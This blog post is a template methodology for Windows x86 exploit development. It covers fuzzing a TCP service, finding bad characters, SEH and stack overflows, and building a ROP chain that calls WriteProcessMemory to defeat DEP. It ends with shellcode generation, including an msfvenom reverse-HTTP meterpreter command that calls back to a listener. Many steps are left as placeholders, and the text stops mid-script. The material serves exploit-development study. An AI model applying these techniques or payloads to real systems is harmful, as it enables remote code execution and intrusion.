---
title: "WPM DEP Bypass Methodology"
excerpt_separator: "<!--more-->"
categories:
  - Blog
tags:
  - Reverse engineering
  - Exploit development
  - Penetration testing
  - Insecure code
---

A quick methodology for DEP WPM. 
<!--more-->

# 9. ROP with WriteProcessMemory

### 1. Program Analysis

- Ports running
- Protections of app
    
    ```python
    .load narly
    !nnmod
    ```
    
- What data or type of data is the application receiving HTTP, TCP, RPC etc.

| Description | Analysis |
| --- | --- |
| Ports |  |
| Protections |  |
| Input Type |  |
| Base Address |  |

### 2. Vuln Discovery

- [ ]  Fuzz the app
    - Type of overflow normal or SEH
    - How many bytes required for overflow
    - What gadgets do we control, do we overwrite EIP, on how many bytes?
    - [https://wiremask.eu/tools/buffer-overflow-pattern-generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator)
    
    ```python
    #!/usr/bin/python
    import socket
    import sys
    
    ######## FUZZ TCP########
    
    size = 1
    while True:
    
        size = size + 10
        inputBuffer = b"A" * size
    
        print("\nFuzzing with {} bytes".format(len(inputBuffer)))
        s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.10.234', 4455))
        s.send(inputBuffer)
        s.close()   
        print("\nDone!"
    ```
    
- [ ]  Analyze the crash: Identify the buffer size check the `ECX` or `EAX` registers.  Do we overwrite `EIP` as expected?
    - Are we overwriting registers?
    - Where is our buffer stores? Is it stored as DWORDs? If stored in UNICODE every character presented as WORD rather than byte, 12 bytes then become 24 byte in unicode. e.g. appends 0x00 to every character
    - How close is our buffer to `ESP`?
    - Restrictions identification
        - Partial overwrites (increase buffer size and recheck) `dds esp L10` e.g. 3 bytes `00414141`
        - Is the buffer treated as a string e.g. `AAAAAA` etc, is a null byte added?
        - Any space restrictions identified?
        - Bad characters e.g. null byte terminated `00414141` as in this example. Monitor the stack e.g. `ESP`, etc., if not crashing, can be bad chars, check mangling (`db esp - 0nSIZE`)
            
            Note uncomment each section as you move through them.. **Check bad chars twice!!**
            
            ```python
            	BADCHARS = (
              b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
              b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
              b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
              b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
              b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
              b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
              b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
              b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
              b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
              b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
              b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
              b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
              b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
              b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
              b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
              b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
            ```
            
- [ ]  Type of overflow e.g. basic stack (`ESP` ≠ `Buffer` and `EIP` control) or SEH
    - Types Description
        - **jump (or call)** Control EIP register via `JMP` or `CALL` —> Binary Search Tree or Unique Strings Monitor Overflow ([https://wiremask.eu/tools/buffer-overflow-pattern-generator/](https://wiremask.eu/tools/buffer-overflow-pattern-generator/))
            
            The register that points to the shellcode. With this technique, you basically use a register that contains the address where the shellcode resides and put that address in EIP. You try to find the opcode of a “jump” or “call” to that register in one of the dll’s that is loaded when the application runs. When crafting your payload, instead of overwriting EIP with an address in memory, you need to overwrite EIP with the address of the “jump to the register”. Of course, this only works if one of the available registers contains an address that points to the shellcode. This is how we managed to get our exploit to work in part 1, so I’m not going to discuss this technique in this post anymore.
            
        - **pop return** : `POP RET`If none of the registers point directly to the shellcode, but you can see an address on the stack (first, second, … address on the stack) that points to the shellcode, then you can load that value into EIP by first putting a pointer to pop ret, or pop pop ret, or pop pop pop ret (all depending on the location of where the address is found on the stack) into EIP.
        - **push return** : `PUSH RET`this method is only slightly different than the “call register” technique. If you cannot find a or opcode anywhere, you could simply put the address on the stack and then do a ret. So you basically try to find a push , followed by a ret. Find the opcode for this sequence, find an address that performs this sequence, and overwrite EIP with this address.
        - **jmp [reg + offset]** : `jmp [reg + offset]`If there is a register that points to the buffer containing the shellcode, but it does not point at the beginning of the shellcode, you can also try to find an instruction in one of the OS or application dll’s, which will add the required bytes to the register and then jumps to the register. I’ll refer to this method as jmp [reg]+[offset]
        - **blind return** : in my previous post I have explained that ESP points to the current stack position (by definition). A RET instruction will ‘pop’ the last value (4bytes) from the stack and will put that address in ESP. So if you overwrite EIP with the address that will perform a RET instruction, you will load the value stored at ESP into EIP.
        - If you are faced with the fact that the available space in the buffer (after the EIP overwrite) is limited, but you have plenty of space before overwriting EIP, then you could use **jump code** in the smaller buffer to jump to the main shellcode in the first part of the buffer.
        - **SEH** : `SEH`Every application has a default exception handler which is provided for by the OS. So even if the application itself does not use exception handling, you can try to overwrite the SEH handler with your own address and make it jump to your shellcode. Using SEH can make an exploit more reliable on various windows platforms, but it requires some more explanation before you can start abusing the SEH to write exploits. The idea behind this is that if you build an exploit that does not work on a given OS, then the payload might just crash the application (and trigger an exception).
            
            So if you can combine a “regular” exploit with a seh based exploit, then you have build a more reliable exploit. Anyways, the next part of the exploit writing tutorial series (part 3) will deal with SEH. Just remember that a typical stack based overflow, where you overwrite EIP, could potentially be subject to a SEH based exploit technique as well, giving you more stability, a larger buffer size (and overwriting EIP would trigger SEH… so it’s a win win)
            

### 3.1 Vanilla Stack Overflow

| Description | Analysis |
| --- | --- |
| Offset overwrite EIP |  |
| Bad Chats |  |
| Space After Overwrite |  |
| DEP |  |
| ASLRS |  |
| Codecave |  |
- [ ]  Get precise offsets for overwrites
    
    [https://wiremask.eu/tools/buffer-overflow-pattern-generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator) 
    
    - Watch out for changing the type of crash
    - Keep it close to original crash byte size
    - If doesn’t work attempt buffer splitting e.g. `260` bytes becomes two `130` byte parts or only the last `XYZ` bytes
    
    ```python
    ALLCHAR = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai'
    
    inputBuffer = b"\x41" * 130
    inputBuffer = b"\x42" * 130
    ```
    
- [ ]  Find instructions to overwrite `EIP` with to navigate to controlled buffer space
    
    [https://defuse.ca/online-x86-assembler.htm#disassembly](https://defuse.ca/online-x86-assembler.htm#disassembly) 
    
    - Need to be static e.g. no ASLR support
    - No bad characters can be contained
    - if DEP support, JMP ESP is within `.text` code segment due to its permissions
    - null byte started addresses can be used, but will terminate after execution not allowing usage of space afterwards
    - add some NOPs afterwards
    - Sometimes `pop eax; ret` is better if you control `eax` registers etc.
    - Add jump code (P/P/R) `0xeb,0x06,0x90,0x90` to jump over SE handler
        
        ```powershell
        #Alternatives to (p/p/r)
        #Use mona SEH module
        1 pop r32 / pop r32 / ret (+ offset)
        2 pop r32 / add esp+4 / ret (+ offset)
        3 add esp+4 / pop r32 / ret (+offset)
        4 add esp+8 / ret (+offset)
        5 call dword [ebp+ or -offset]
        6 jmp dword [ebp+ or -offset]
        7 popad / push ebp / ret (+ offset)
        
        #check protections with narly, we want SafeSEH off
        .load narly
        lm m libspp
        #now search for opcodes using own script
        
        #address cannot have bad characters
        $$>a<C:\Temp\ppr-finder.wds 10000000 10226000
        
        #check the address is correct instructions
        u 1007cf53 L4
        
        #test by setting breakpoint
        bp 1007cf53
        ```
        
    - Limitation Partial EIP Control/Overwrite
        
        If our application is `null` byte terminated, our address space includes `null` byte. We can perform partial `EIP` overwrite. 
        
        We utilise the string null terminator as part of the `EIP` overwrite. Note we cannot store any data past the return address.
        
        ```python
        # Partial overwrites (increase buffer size and recheck) dds esp L10 e.g. 3 bytes 00414141 
        
        We therefore overwite only the 3 bytes e.g. 
        inputBuffer += b"\x42" * 4
        # becomes...
        inputBuffer += b"\x42\x42\x42"
        
        Will result in 00424242 result.
        
        ```
        

### 3.2 SEH Based Overflow

| Description | Analysis |
| --- | --- |
| Offset overwite SEH |  |
| Modules with SAFESEH |  |
| Address to P/P/R |  |
| short jump on NEH: 0x06eb9090  |  |
| Bad Chars |  |
| Space after SEH  |  |
| DEP |  |
| ASLRS |  |
- [ ]  Check if SEH control e.g. SE Handler and the next SEH are overwritten.
    
    ```cpp
    !exchain
    !teb
    dt _EXCEPTION_REGISTRATION_RECORD xxx
    
    ```
    
- [ ]  Check if application handled or OS handled
    
    ```powershell
    !analyze -v
    
    #lookout for the EXCEPTION_RECORD if ffffffff the 
    #application didn't handled it and the default OS handler did since its at the bottom of the chain
    ```
    
- [ ]  Find offsets to the required locations ([https://wiremask.eu/tools/buffer-overflow-pattern-generator/](https://wiremask.eu/tools/buffer-overflow-pattern-generator/))
    - overwrite the current SE Handler (should be right after the “next SEH” )
    - overwrite the next SEH (with jump to shellcode)
    - shellcode location
    
    ```powershell
    0:008> !exchain
    0172fe0c: libpal!md5_starts+149fb (008fdf5b)
    0172ff44: 33654132                                [128 offset SE Handler] (SEH)
    Invalid exception stack at 65413165               [124 offset Next SEH] (nSEH)
    ```
    
- [ ]  Identify bad characters dump  `EstablishFrame` bytes.
    
    ```powershell
    #Use Mona in future
    
    42424242 ??              ???
    0:008> dds esp L5
    0179f440  771c5af2 ntdll!ExecuteHandler2+0x26
    0179f444  0179f540
    0179f448  0179ff44                 [VOID EstablishFrame]
    0179f44c  0179f55c
    0179f450  0179f4cc
    0:008> db 0179ff44
    0179ff44  41 41 41 41 42 42 42 42-01 00 00 00 ec 07 90 00  AAAABBBB........
    0179ff54  10 3e 90 00 d8 5f e7 00-72 40 90 00 98 7a e6 00  .>..._..r@...z..
    0179ff64  d8 5f e7 00 24 3e 90 00-98 7a e6 00 10 3e 90 00  ._..$>...z...>..
    0179ff74  39 cf aa 75 d8 5f e7 00-20 cf aa 75 dc ff 79 01  9..u._.. ..u..y.
    0179ff84  b5 26 14 77 d8 5f e7 00-30 bb a7 60 00 00 00 00  .&.w._..0..`....
    0179ff94  00 00 00 00 d8 5f e7 00-00 00 00 00 00 00 00 00  ....._..........
    
    0:008> db 0171ff44 L1000
    0171ff44  41 41 41 41 42 42 42 42-01 03 04 05 06 07 08 09  AAAABBBB........
    0171ff54  0b 0c 0e 0f 10 11 12 13-14 15 16 17 18 19 1a 1b  ................
    0171ff64  1c 1d 1e 1f 20 21 22 23-24 25 26 27 28 29 2a 2b  .... !"#$%&'()*+
    0171ff74  2c 2d 2e 2f 30 31 32 33-34 35 36 37 38 39 3a 3b  ,-./0123456789:;
    0171ff84  3c 3d 3e 3f 40 41 42 43-44 45 46 47 48 49 4a 4b  <=>?@ABCDEFGHIJK
    0171ff94  4c 4d 4e 4f 50 51 52 53-54 55 56 57 58 59 5a 5b  LMNOPQRSTUVWXYZ[
    0171ffa4  5c 5d 5e 5f 60 61 62 63-64 65 66 67 68 69 6a 6b  \]^_`abcdefghijk
    0171ffb4  6c 6d 6e 6f 70 71 72 73-74 75 76 77 78 79 7a 7b  lmnopqrstuvwxyz{
    0171ffc4  7c 7d 7e 7f c2 80 c2 81-00 ff 71 01 b0 84 1b 77  |}~.......q....w
    0171ffd4  db 94 77 cb 00 00 00 00-ec ff 71 01 89 26 14 77  ..w.......q..&.w
    0171ffe4  ff ff ff ff 7e 5c 1c 77-00 00 00 00 00 00 00 00  ....~\.w........
    0171fff4  10 3e 8e 00 c0 5e df 00-00 00 00 00 ?? ?? ?? ??  .>...^......????
    ```
    
- [ ]  Add jump code (P/P/R) `0xeb,0x06,0x90,0x90` to jump over SE handler
    
    ```powershell
    #Alternatives to (p/p/r)
    #Use mona SEH module
    1 pop r32 / pop r32 / ret (+ offset)
    2 pop r32 / add esp+4 / ret (+ offset)
    3 add esp+4 / pop r32 / ret (+offset)
    4 add esp+8 / ret (+offset)
    5 call dword [ebp+ or -offset]
    6 jmp dword [ebp+ or -offset]
    7 popad / push ebp / ret (+ offset)
    #check protections with narly, we want SafeSEH off
    .load narly
    lm m libspp
    #now search for opcodes using own script
    #address cannot have bad characters
    $$>a<C:\Temp\ppr-finder.wds 10000000 10226000
    #check the address is correct instructions
    u 1007cf53 L4
    #test by setting breakping
    bp 1007cf53
    ```
    

### 4. WriteProcessMemory Recap

This function will allow you to copy your shellcode to another (executable) location so you can jump to it & execute it. During the copy, WPM() will make sure the destination location is marked as writeable. You only have to make sure the target destination is executable. This function requires six parameters on the stack :

| return address | Address where WriteProcessMemory() needs to return to after it finished |
| --- | --- |
| hProcess | the handle of the current process. Should be -1 to point to the current process (Static value 0xFFFFFFFF) |
| lpBaseAddress | pointer to the location where your shellcode needs to be written to. The "return address" and "lpBaseAddress" will be the same. |
| lpBuffer | based address of your shellcode (dynamically generated, address on the stack) |
| nSize | number of bytes that need to be copied to the destination location |
| lpNumberOfBytesWritten | writeable location, where number of bytes will be written to |

```python
		# BOOL WriteProcessMemory(
    #   HANDLE  hProcess,
    #   LPVOID  lpBaseAddress,
    #   LPCVOID lpBuffer,
    #   SIZE_T  nSize,
    #   SIZE_T  *lpNumberOfBytesWritten
    # );
    #

    va  = pack("<L", (0x41414141))  # WriteProcessMemory address
    va += pack("<L", (0x42424242))  # shellcode return address to return to after WriteProcessMemory is called
    va += pack("<L", (0xffffffff))  # hProcess (pseudo Process handle)
    va += pack("<L", (0x44444444))  # lpBaseAddress (Code cave address)
    va += pack("<L", (0x45454545))  # lpBuffer (shellcode address)
    va += pack("<L", (0x46464646))  # nSize (size of shellcode)
    va += pack("<L", (0x47474747))  # lpNumberOfBytesWritten (writable memory address, i.e. !dh -a MODULE)

```

### 5. Payload Update and Gadget Searching

We update our payload to incorporate our ROP gadgets and buffer that we will be using. We update our payload as follows:

- WPM Structure for loading parameters, with dummy values
- Offset is added to overflow the buffer
- EIP placeholder is added to control EIP overwrite
- ROP is added as placeholder for our ROP chain
- NOP padding is added before our shellcode
- Shellcode placeholder is also added

```python

## Bad chars: 
## EIP Overwrite Address:
## DLLBase Address: 
## EIP Overwrite Size:

 
###################
## WPM STRUCTURE ##
###################
		# BOOL WriteProcessMemory(
    #   HANDLE  hProcess,
    #   LPVOID  lpBaseAddress,
    #   LPCVOID lpBuffer,
    #   SIZE_T  nSize,
    #   SIZE_T  *lpNumberOfBytesWritten
    # );
   
va  = pack("<L", (0x41414141))  # WriteProcessMemory address
va += pack("<L", (0x42424242))  # shellcode return address to return to after WriteProcessMemory is called
va += pack("<L", (0xffffffff))  # hProcess (pseudo Process handle)
va += pack("<L", (0x44444444))  # lpBaseAddress (Code cave address)
va += pack("<L", (0x45454545))  # lpBuffer (shellcode address)
va += pack("<L", (0x46464646))  # nSize (size of shellcode)
va += pack("<L", (0x47474747))  # lpNumberOfBytesWritten (writable memory address, i.e. !dh -a MODULE)

###################
##    OVERFLOW   ##
###################
# Offset until EIP overflow
offset = b"A" * (0 - len(va))

###################
## EIP Overwrite ##
###################
#W e ocontrol EIP overwrite  
eip = pack("<L", (0x90909090)) #  DESCRIPTION

###################
##  ROP Gadgets  ##
###################
rop = pack("<L", (0x90909090)) #  DESCRIPTION
rop += pack("<L", (0x90909090)) #  DESCRIPTION

#####################
## NOP & Shellcode ##
#####################
# NOP Padding before shellcode, adjust as needed
rop += b"\x90" * (000 - len(offset) - len(eip))

#Shellcode placeholder at around 450 bytes size
shellc = b"\xCC" * 450

inputbuffer = offset + va + eip + rop + shellc

```

We will now use RP++ and a custom built power-shell script to generate and sort gadgets that we can utilise. 

```python
.\rp-win-x86.exe -f C:\Users\initroot\xxxx -r 3 > gadgets.txt
```

```python
..\..\2.Automation\rop-gadgetsorter.ps1 C:\Users\initroot\xxxx\gadgets > sortedgadets.txt

gci .\gadgets  -File -Recurse -EA SilentlyContinue | Select-String -Pattern "(mov e[a-z][a-z], esp).*?((retn  ;)|(ret  ;))"  | Select-String -Pattern "(leave)" -NotMatch
```

We also make use of an power-shell `gci` function to manually sort and filter our gadgets. For now we build a quick table that allows us to do simple things like copy between etc.

We analyse our ROP gadgets to setup backup and restore gadgets that can be used during the exploit process.

| Gadget Location | From | To | Gadget Ins. |
| --- | --- | --- | --- |
|  |  |  |  |
|  |  |  |  |
|  |  |  |  |
|  |  |  |  |
|  |  |  |  |
|  |  |  |  |
|  |  |  |  |
|  |  |  |  |
|  |  |  |  |
|  |  |  |  |
|  |  |  |  |
|  |  |  |  |
|  |  |  |  |
|  |  |  |  |

### 6. Stack Prep

We need to find the stack address of our current dummy registers, this can be done by using the value in `ESP`. We can’t modify `ESP` as it will point to the next gadget, however, we can copy it to another register. The following ways can be used to obtain a copy of the `ESP` register. Important to ensure we are carried towards our next ROP chain values else execution will not continue.

```python
mov XXX, XXX; ret
xchg XXX, XXX; ret
pop XXX; mov XXX, XXX; ret
lea XXX, [XXX]; ret
```

We look for gadgets, we rely on a mix of our sorted ROP gadget output file and performing manual searching using ***gci*** command pointed to our ROPS folder. In the below example, we look for `PUSH ESP` gadgets. As a reminder our bad chars are: XXXXX.

```python

```

We update our payload as follow:

```python

```

The above will do the following:

- XX
- XX

Now we need to resolve our `WriteProcessMemory` address dynamically.

### 7. Resolving WPM Address

We need to obtain the location of our `WriteProcessMemory` from the Import Address Table (IAT) table. The Import Address Table (IAT) is a crucial part of the Windows Portable Executable (PE) format used to manage dynamic linking of libraries. When a program calls a function from a dynamically linked library, it references the function's entry in the IAT. 

Considering we cannot copy the executable we will be using WinDBG to obtain the address.

1. List loaded modules and note their base address `lm`.
    
    ```python
    
    ```
    
2. Dump the header from the dll your interested in `!dh <module> –f`.
    
    ```python
    
    ```
    
3. From the output from `!dh` look for the the “Import Address Table Directory”. 
    
    ```python
    
    ```
    
4. Use the `d` command to dump the address at that offset and try to resolve them to symbols e.g. `dps 00000000+X000`
    
    ```python
    
    ```
    

From the above we can identify that our `WriteProcessMemoryStub` is located at: XXXXXX. Now we need to do the following.

- Obtain address on stack where the dummy DWORD is e.g. dummy `WriteProcessMemory` address
- resolve the address of `WriteProcessMemory` e.g. fetch the correct address
- Write that value to top of the placeholder value e.g. patch the chain to point to `WriteProcessMemory`

```python
dds XXXXXX
```

We update our payload and set everything to identify if our dummy addresses are pushes correctly before we proceed.

```python

```

As we are pushing `0x45454545` onto the stack as a dummy value, we want to identify where on the stack our dummy address is as shown below. We step through the instructions until the very last chain event and then calculate the offset. 

```python

? eax - XXXXX  

dd XXXXX  

```

From the above we learn that we need to move `0xXX` bytes from `ESP` e.g. `ESP - 0xXX` to reach our `WriteProcessMemory` dummy Address. Because we control `ESP`, we looking at where our example landed. Since we have a copy of the original `ESP` in the `EAX` register, we need to make some adjustments to move backwards from `ESP`. We ideally need gadgets like:

```python
SUB EAX, XXXXXX
RETN
```

Since we can't find the gadget, we have reached a pitfall and need to get a bit more creative. 

```python
gci .\gadgets  -File -Recurse -EA SilentlyContinue | Select-String -Pattern "(sub eax).*?((retn  ;)|(ret  ;))"
###no results###
```

Excellent, XXX register points to our WPM prototype and our first address resolves the WPM memory location successfully. We have successfully patched the address of `WriteProcessMemory` at runtime. Before we proceed further we ensure we make a copy of our ESP into another register. 

### 8. Patching WPM Parameters

### Codecave Hunting

 Let’s recap our overall exploit structure, we will need to copy our shellcode to the codecave. 

[offset] —> [writeprocessmemory] —> [eip] —> [rop] —> [shellcode]

We now need to patch in the address where WriteProcessMemory() needs to return to after it finished. Before we can proceed we need to identify the codecave where we can copy our shellcode to. The requirements would be that we should utilise a memory location with *Execute* permissions. We first check the location where our shellcode is currently residing in. We will also need to dynamically resolve the address and can potentially utilise a pivot to jump to our shellcode. We check the memory protections where our current shellcode is located. 

```python
dds XXXX + 0x210 L10

```

From the above we note that our shellcode start at offset XXXX. Keep in mind that `0x454545` currently represents our shellcode as per our payload.  Based on our checks we identify that we have no **EXECUTE** permission and would need to search for a new codecave. To find a codecave we will search for null bytes at the end of a code section’s upper bounds. We find the start of the code pages by looking at the PE header. We find the offset to the PE header by dumping the DWORD at offset XXX from the MZ header. Next we add XXXX to the offset to find the offset to the code section.

```python
0:004> dd XXXX + 3c L1
0:004> dd XXXX + f8 + 2c L1
0:004> ? XXXX + 1000

```

We use the `!address` command to collect information from that section. and we want to have *EXECUTE* permissions.

```python
0:004> !address XXXXX
```

From above we can identify the upper bound of the code section. To now find the code cave we can subtract a large value from the upper bound to find unused memory large enough to store shellcode.

```python
0:004> dd ENDADDRESS - 200

0:004> ? ENDADDRESS-200 - processname

```

It looks like our code stars at `0x2e00` and we compensate for the null byte by adding four bytes e.g. `0x2e04`. We seem to not have alot of space here. So next we will see if we cannot use the *.text* area of the module instead.

```python

0:004> !dh processname

SECTION HEADER #1
   .text name
    **1E39 virtual size
    1000 virtual address**
    2000 size of raw data
     400 file pointer to raw data
       0 file pointer to relocation table
       0 file pointer to line numbers
       0 number of relocations
       0 number of line numbers
60000020 flags
         Code
         (no align specified)
         Execute Read

0:004> dd processname + **virtualSize** + virtualAddress 

0:004> !vprot address
AllocationProtect: 00000080  PAGE_EXECUTE_WRITECOPY
RegionSize:        00001000
State:             00001000  MEM_COMMIT
Protect:           00000020  PAGE_EXECUTE_READ
Type:              01000000  MEM_IMAGE

```

Perfect it seems we have found a spot for our shellcode in the .text section with Execute permissions. Further calculations show we have around XXX bytes for our shellcode. We therefor proceed with our shellcode location as XXXX. 

### Shellcode Return Address

Now that we have our shellcode location, we can proceed in writing the location into the dummy address. We update our WPM as follows:

```python
va  = pack("<L", (0x41414141))  # WriteProcessMemory address
va += pack("<L", (0x42424242))  # shellcode return address to return to after WriteProcessMemory is called
va += pack("<L", (0xffffffff))  # hProcess (pseudo Process handle)
va += pack("<L", (0x44444444))  # lpBaseAddress (Code cave address)
va += pack("<L", (0x45454545))  # lpBuffer (shellcode address)
va += pack("<L", (0x46464646))  # nSize (size of shellcode)
va += pack("<L", (0x47474747))  # lpNumberOfBytesWritten (writable memory address, i.e. !dh -a MODULE)
```

### hProcess

We don’t have to do much for the `hProcess` as the parameter should point to the current process, which in our instance would then be `0xFFFFFFFF` which we already hardcoded. The `handle` parameter is quite easy to fill - we can even use a static value. According to Microsoft Docs, `[GetCurrentProcess()](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocess)` returns a handle to the current process. More specifically, it returns a “*pseudo handle*” to the current process. A pseudo handle, denoted by -1 or `0xFFFFFFFF`, is “*special*” constant that refers to a handle to the current process. This means, whenever a Windows API function requests a handle (*generally in user mode*), passing `0xFFFFFFFF` will tell the API in question to utilize a handle to the current process. Since we would like to write our shellcode to memory within the process space - passing `0xFFFFFFFF` to the `kernel32!WriteProcessMemory` function call will tell the function we would like to write the memory to virtual memory within the current process space.

```python
#WriteProcessMemory 
va  = pack("<L", (0x45454545)) # dummy WriteProcessMemory Address
va += pack("<L", (0x42424242)) # Shellcode Return Address 0x45402e39 where our codecave in the .text area exist
**va += pack("<L", (0xFFFFFFFF)) # hProccess = handle to current process (Pseudo handle = 0xFFFFFFFF points to current process)**
va += pack("<L", (0x44444444)) # lpBaseAddress Code cave address 0x45402e39 where our codecave in the .text area exist
va += pack("<L", (0x49494949)) # # dummy lpBuffer (stack address)
va += pack("<L", (0x51515151)) # dummy nSize
va += pack("<L", (0x41414141)) # lpNumberOfBytesWritten
```

### lpBaseAddress

The `lpBaseAddress` should be equal to our shellcode address e.g. codecave. We update our WPM structure as follow replacing the `0x44444444` with `0x55102d39`.

```python
#WriteProcessMemory 
va  = pack("<L", (0x45454545)) # dummy WriteProcessMemory Address
va += pack("<L", (0x42424242)) # Shellcode Return Address 0x45402e39 where our codecave in the .text area exist
va += pack("<L", (0xFFFFFFFF)) # hProccess = handle to current process (Pseudo handle = 0xFFFFFFFF points to current process)
**va += pack("<L", (**0x44444444**)) # lpBaseAddress Code cave address 0x45402e39 where our codecave in the .text area exist**
va += pack("<L", (0x49494949)) # # dummy lpBuffer (stack address)
va += pack("<L", (0x51515151)) # dummy nSize
va += pack("<L", (0x41414141)) # lpNumberOfBytesWritten
```

[CodeCave](https://www.notion.so/CodeCave-12931889342a47daa008a7650aec9967?pvs=21)

### lpBuffer

The `lpBuffer` will be a pointer to our shellcode (********************************************which first needs to be written to the stack********************************************). We will resolve this dynamically with ROP gadgets. Let’s dive in. Recall that `kernel32!WriteProcessMemory` will take in a source buffer and write it somewhere else. 

Since we have control of the stack, we will just preemptively place our shellcode there. Let’s recap which values we have in the registers. 

```python

```

We will need to extract the value the memory address pointing to by using an arbitrary write primitive. When we get the address of the `lpBuffer` into a register, we will then not overwrite the register but rather utilise something like `dword ptr [reg]` which will force the address onto the stack to point to something like `0x49494949`. **Remember - every time the process is terminated and restarted - the virtual memory on the stack changes. This is why we need to dynamically resolve this parameter, instead of hardcoding an address.**

```python

```

We see that everything works as expected and we successfully have our `lpBuffer` written.

### nSize

Next up we have the `nSize` value. The value should be the number of bytes written e.g. size of the shellcode + NOPs in most instances. For this specifically we would like to utilise at least `0x180` bytes (384 decimal). For this we continue with our shellcode where we increase the `X` register to align with the buffer location WriteProcessMemory. 

```python

```

### lpNumberOfBytesWritten

We don’t require to use the gadget so we just simply zero it out. `lpNumberOfBytesWritten` is an optional argument that can be set to null. You could provide a pointer to a variable that will receive the number of bytes transferred by WPM but this is not needed here.

```python

```

Perfect we have successfully written all the parameters for WPM, and next we need to call `kernel32!WriteProcessMemory`.

### 9. Executing WPM

We should now execute our WPM as the stack has been successfully setup. By now we should be `0x20` bytes away from our WPM Prototype’s first parameter which points to `kernel32!WriteProcessMemory`.

We search for gadgets that will decrease the registers we control. 

```bash

```

We adjust our exploit as follows:

```bash

```

A final check before we attempt to execute WPM is to check if our `lpBuffer` is correctly sized still given the changes in our ROP exploit.  We check that our WPM is invoked and that the parameters are setup correctly. We set a breakpoint and once WPM is started we check ESP.

```python
0:004> p
eax=009cebe0 ebx=00000077 ecx=45403020 edx=ffffffff esi=009ce87c edi=77610ca1
eip=77610ca0 esp=009ce880 ebp=ffffffff iopl=0         nv up ei pl nz ac pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216
KERNEL32!WriteProcessMemoryStub:
77610ca0 8bff            mov     edi,edi
0:004> dds esp 
```

Next we check if the shellcode is copied, so we dump the contents of our codecave before and after execution.

```python
u XXXXXX
```

### 10. Shellcode Execution with WPM

- Shellcode Generate
    
    [https://github.com/ommadawn46/win-x86-shellcoder](https://github.com/ommadawn46/win-x86-shellcoder)
    
    [](https://github.com/epi052/osed-scripts/blob/main/shellcoder.py)
    
    To execute shellcode we identify another issue when utilising WPM. The decoding stub added to shellcode by msfvenom will break our shellcode since the shellcode does not have write permissions within the code cave, we can instead solve this hurdle by utilizing an ROP decoder or by manually removing the bad characters. Before we remove our bad characters let’s first see what we working with. Using the python script that will generate our shellcode. The script effectively does the following:
    
     We are resolving symbols from `kernel32.dll` using the PEB method. To generate our shellcode we run the following command. 
    
    ```bash
    python3.8 epi052shellcoder.py -l 192.168.10.202 -p 8080
    ```
    
    - Transform ASM code into opcodes
    - Allocate a chunk of memory for our shellcode
    - Copy our shellcode to the allocated memory
    - Execute the shellcode from the allocated memory
    
    We can also utilise MSFvenom without specifying the use of an encoder.
    
    ```python
    msfvenom -p windows/meterpreter/reverse_http LHOST=10.211.55.3 LPORT=8080 -f python -v shellcode
    ```
    
    The above generates the following shellcode.
    
    ```bash
    shellcode =  b""
    shellcode += b"\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2"
    shellcode += b"\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x0f"
    shellcode += b"\xb7\x4a\x26\x31\xff\x8b\x72\x28\x31\xc0\xac"
    ```
    
- Bad Char Identification
    
    Now to ensure we have no bad characters, we utilise the following script:
    
    ```python
    import re
    import os
    import sys
    import ctypes
    import struct
    import argparse
    import subprocess
    
    from keystone import Ks, KS_ARCH_X86, KS_MODE_32, KsError
    
    # Defines how far to the right the opcodes are printed
    # should be greater than the length of the longest instruction
    SPACE_WIDTH = 30
    
    ccode = [
    
    ]
    
    def print_section_title(section_title: str) -> None:
        print()
        print("*" * len(section_title))
        print(section_title)
        print("*" * len(section_title))
        print()
    
    def format_badchars(badchars: str) -> list:
